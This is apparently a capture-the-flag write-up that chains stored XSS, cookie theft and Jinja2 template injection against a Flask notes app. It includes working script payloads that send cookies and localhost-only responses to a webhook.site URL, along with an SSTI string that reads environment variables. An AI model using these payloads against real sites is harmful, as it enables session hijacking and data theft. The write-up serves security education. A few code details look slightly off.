---
title: 'Sectalk Sydney Ninja Night CTF #18 Writeup'
date: 2026-05-12
excerpt: 'Chaining XSS, cookie exfiltration, and SSTI to capture three flags at a CTF night'
tags: ['security', 'ctf']
draft: false
---

## Flag 1

After logging into the application, users are able to write their own notes:

![note input](/public/04/003-ninja-ctf.png)

After uploading the note, users are able to view its content:

![note content](/public/04/004-ninja-ctf.png)

The report to admin

### Vulnerability - Flag 1

The way the note is rendered is vulnerable to XSS injection, the source code of how its rendered is shown below:

`note.html` template:

![note.html](/public/04/005-ninja-ctf.png)

flask `app.py` route to serve `note.html`

![app.py](/public/04/006-ninja-ctf.png)

Because user's input is being rendered as html, arbitrary html tags can be injected to run javascript as shown below

![javascript alert](/public/04/007-ninja-ctf.png)

![dom](/public/04/008-ninja-ctf.png)

The JWT token used for user authentication does not have `http only` option selected, which allows it to be accessed by javascript, making exfiltration possible

![application cookies](/public/04/009-ninja-ctf.png)

### Attack path - Flag 1

One giveaway for XSS (cross site scripting) CTFs is when we can report things to admins.

A simple way to extract the cookies is to forge a request to our controlled site as such:

Payload:

```html
<script>
  fetch('https://webhook.site/...4fe?c=' + document.cookie)
</script>
```

## Flag 2

This is the source code for flag 2 endpoint:

![flag 2 code](/public/04/010-ninja-ctf.png)

We need the admin to retrieve the flag, and it can only be accessed locally, so even if we forged a valid JWT cookie, we may not be able to access the endpoint.

### Attack path - Flag 2

What we can do is do chain the HTTP requests that the admin makes:

> call `/flag2` --> receives response --> sends response to webhook

And the readme exposes the port to access the application locally:

![readme docker command](/public/04/011-ninja-ctf.png)

Payload:

```html
<script>
  fetch('http://127.0.0.1:1337/flag3')
    .then((r) => r.text())
    .then((html) =>
      fetch('https://webhook.site/...4fe', {
        method: 'POST',
        body: html,
      }),
    )
</script>
```

## Flag 3

This is the source code for flag 3 endpoint:

![flag 3 source code](/public/04/012-ninja-ctf.png)

### Vulnerability - Flag 3

We note that the user accessing this endpoint no longer has to be admin.

More importantly, page html is being rendered with Flask's `render_template_string` function which is vulnerable to Server Side Template Injection (SSTI). The injection point would be the current user's name, which is set during account creation.

However, it can only be called locall (from IP 127.0.0.1).

### Attack path - Flag 3

Since it is a Flask application, Jinja 2 is the templating engine used.

In the Dockerfile provided, we observe that flag 3 is one of the environment variables:

![dockerfile](/public/04/013-ninja-ctf.png)

To access the flag, this is the SSTI payload would be:

`{{config.class.init.globals['os'].environ.get('FLAG3')}}`

A user was created with the above payload in the name:

![register page with payload](/public/04/014-ninja-ctf.png)

However, we need the admin to use the malicious account to access the page so that the payload is injected.

To achieve that, we make the admin login as the malicious account before calling `/flag3`.

The payload is as below:

```html
<script>
  fetch('http://127.0.0.1:1337/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'user-email', password: 'password' }),
  })
    .then((r) => r.json())
    .then((data) => fetch('http://127.0.0.1:1337/flag3'))
    .then((r) => r.text())
    .then((html) =>
      fetch('https://webhook.site/...4fe', {
        method: 'POST',
        body: html,
      }),
    )
</script>
```
